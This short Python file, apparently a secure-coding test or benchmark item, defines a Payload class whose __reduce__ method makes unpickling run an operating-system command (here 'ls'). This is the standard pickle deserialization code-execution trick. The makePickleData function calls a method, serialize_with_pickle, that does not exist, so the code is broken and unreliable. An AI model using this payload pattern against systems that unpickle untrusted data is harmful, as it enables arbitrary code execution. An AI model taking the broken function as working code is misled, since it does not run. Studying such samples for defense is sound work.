import pickle


class Payload(object):
    def __reduce__(self):
        return exec, ('import os;os.system("ls")',)


def makePickleData(payload: Payload):
    '''
    Get serialized data from the payload object and serialize it before returning it
    '''
    payload.serialize_with_pickle(pickle.dumps(payload))    
